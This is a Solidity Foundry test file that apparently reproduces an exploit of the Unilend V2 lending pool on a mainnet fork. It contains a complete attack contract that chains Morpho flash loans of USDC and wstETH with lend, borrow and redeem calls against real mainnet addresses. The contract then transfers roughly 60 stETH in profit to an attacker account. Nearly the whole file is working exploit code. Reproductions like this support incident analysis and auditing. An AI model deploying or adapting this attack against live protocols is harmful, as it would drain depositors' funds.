
pragma solidity ^0.8.20;

import {IERC20Like, Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 21608069;
    uint256 constant TX_TIMESTAMP = 1736680799;
    uint256 constant TX_BLOCK_NUMBER = 21608070;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        UnilendAttack attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (UnilendAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _etchRuntime();
            attack = UnilendAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new UnilendAttack();
        }
    }

    function _prepareProfit(UnilendAttack attack) internal {
        _prepareProfit(address(attack), address(0));
    }

    function _etchRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(UnilendAttack).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.attack_contract, attack, Addresses.stETH_FE84, "stETH", 1);
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.stETH_FE84, "stETH", 60672854887643676586);
    }
}

contract UnilendAttack {
    uint256 private constant USDC_FLASH_AMOUNT = 60000000000000;
    uint256 private constant WSTETH_FLASH_AMOUNT = 5757882098882308991;
    uint256 private constant STETH_UNWRAPPED = 6853968499544955185;
    uint256 private constant STETH_WRAP_INPUT = 6853968499544955186;
    uint256 private constant STETH_BORROW_AMOUNT = 60672854887643676589;
    uint256 private constant MORPHO_CALLBACK_KIND = 0x73;
    int256 private constant USDC_LEND_AMOUNT = -60000000000000;
    int256 private constant STETH_LEND_AMOUNT = 6853968499544955185;
    int256 private constant STETH_DEBT_AMOUNT = 60672854887643676589;

    bool private usdcCallbackSeen;
    bool private wstethCallbackSeen;

    function attack() external payable {
        _startUsdcFlash();
    }

    function flashCallback() internal {
        usdcCallbackSeen = true;
        _quoteWstethDebt();
        _approveMorpho();
        _approveUnilend();
        _flashWsteth();
    }

    function _quoteWstethDebt() internal view {
        IERC20Like(Addresses.stETH_FE84).balanceOf(Addresses.UnilendV2Pool);
        IUnilendV2Pool(Addresses.UnilendV2Pool).token1Data();
        IERC20Like(Addresses.stETH_FE84).balanceOf(Addresses.UnilendV2Pool);
        IwstETH(Addresses.wstETH).getWstETHByStETH(STETH_WRAP_INPUT);
    }

    function _approveMorpho() internal {
        IERC20Like(Addresses.USDC).approve(Addresses.Morpho, type(uint256).max);
        IERC20Like(Addresses.wstETH).approve(Addresses.Morpho, type(uint256).max);
    }

    function _approveUnilend() internal {
        IERC20Like(Addresses.USDC).approve(Addresses.UnilendV2Core, type(uint256).max);
        IERC20Like(Addresses.stETH_FE84).approve(Addresses.UnilendV2Core, type(uint256).max);
        IERC20Like(Addresses.stETH_FE84).approve(Addresses.wstETH, type(uint256).max);
    }

    function _flashWsteth() internal {
        bytes memory morphoUserData = abi.encode(MORPHO_CALLBACK_KIND, Addresses.wstETH);
        IMorpho(Addresses.Morpho).flashLoan(Addresses.wstETH, WSTETH_FLASH_AMOUNT, morphoUserData);
    }

    function flashCallback2() internal {
        wstethCallbackSeen = true;
        _settleWstethLoan();
        _manipulateUnilend();
        _restoreWsteth();
        _collectProfit();
    }

    function _settleWstethLoan() internal {
        IERC20Like(Addresses.USDC).balanceOf(address(this));
        IwstETH(Addresses.wstETH).unwrap(WSTETH_FLASH_AMOUNT);
    }

    function _manipulateUnilend() internal {
        IUnilendV2Core(Addresses.UnilendV2Core).lend(Addresses.UnilendV2Pool, USDC_LEND_AMOUNT);
        IUnilendV2Core(Addresses.UnilendV2Core).lend(Addresses.UnilendV2Pool, STETH_LEND_AMOUNT);
        IUnilendV2Pool(Addresses.UnilendV2Pool).getAvailableLiquidity1();
        IUnilendV2Core(Addresses.UnilendV2Core)
            .borrow(Addresses.UnilendV2Pool, STETH_DEBT_AMOUNT, 0, address(this));
        IUnilendV2Core(Addresses.UnilendV2Core)
            .redeemUnderlying(Addresses.UnilendV2Pool, STETH_LEND_AMOUNT, address(this));
        IUnilendV2Core(Addresses.UnilendV2Core)
            .redeemUnderlying(Addresses.UnilendV2Pool, USDC_LEND_AMOUNT, address(this));
    }

    function _restoreWsteth() internal {
        IwstETH(Addresses.wstETH).getStETHByWstETH(WSTETH_FLASH_AMOUNT);
        IwstETH(Addresses.wstETH).wrap(STETH_WRAP_INPUT);
    }

    function _collectProfit() internal {
        uint256 attackStethBalance = IERC20Like(Addresses.stETH_FE84).balanceOf(address(this));
        IERC20Like(Addresses.stETH_FE84).transfer(Addresses.attacker_eoa, attackStethBalance);
    }

    function _startUsdcFlash() internal {


        _approveMorpho();
        _approveUnilend();
        bytes memory morphoUserData = abi.encode(MORPHO_CALLBACK_KIND, Addresses.USDC);
        IMorpho(Addresses.Morpho).flashLoan(Addresses.USDC, USDC_FLASH_AMOUNT, morphoUserData);
    }

    receive() external payable {}

    function onMorphoFlashLoan(uint256 borrowedAmount, bytes calldata callbackData) external payable {
        callbackData;
        if (borrowedAmount == USDC_FLASH_AMOUNT) {
            if (!usdcCallbackSeen) flashCallback();
            return;
        }
        if (borrowedAmount == WSTETH_FLASH_AMOUNT) {
            if (!wstethCallbackSeen) flashCallback2();
            return;
        }
        if (!usdcCallbackSeen) flashCallback();
    }

    fallback() external payable {
        if (msg.sig == 0x66f28d10) {
            _startUsdcFlash();
            return;
        }
    }
}

library Addresses {
    address internal constant attack_contract = 0x3F814e5FaE74cd73A70a0ea38d85971dFA6fdA21;
    address internal constant UnilendV2Pool = 0x4E34DD25Dbd367B1bF82E1B5527DBbE799fAD0d0;
    address internal constant attacker_eoa = 0x55F5f8058816D5376DF310770Ca3A2e294089C33;
    address internal constant UnilendV2Core = 0x7f2E24D2394f2bdabb464B888cb02EbA6d15B958;
    address internal constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant stETH_FE84 = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
    address internal constant Morpho = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
}

interface IMorpho {
    function flashLoan(address, uint256, bytes calldata) external;
}

interface IUnilendV2Core {
    function borrow(address, int256, uint256, address) external;
    function lend(address, int256) external returns (uint256);
    function redeemUnderlying(address, int256, address) external returns (uint256);
    function redeemUnderlying(uint256 redeemAmount) external returns (uint256);
}

interface IUnilendV2Pool {
    function getAvailableLiquidity1() external view returns (uint256);
    function token1Data() external view;
}

interface IwstETH {
    function getStETHByWstETH(uint256) external view returns (uint256);
    function getWstETHByStETH(uint256) external view returns (uint256);
    function unwrap(uint256) external returns (uint256);
    function wrap(uint256) external returns (uint256);
}
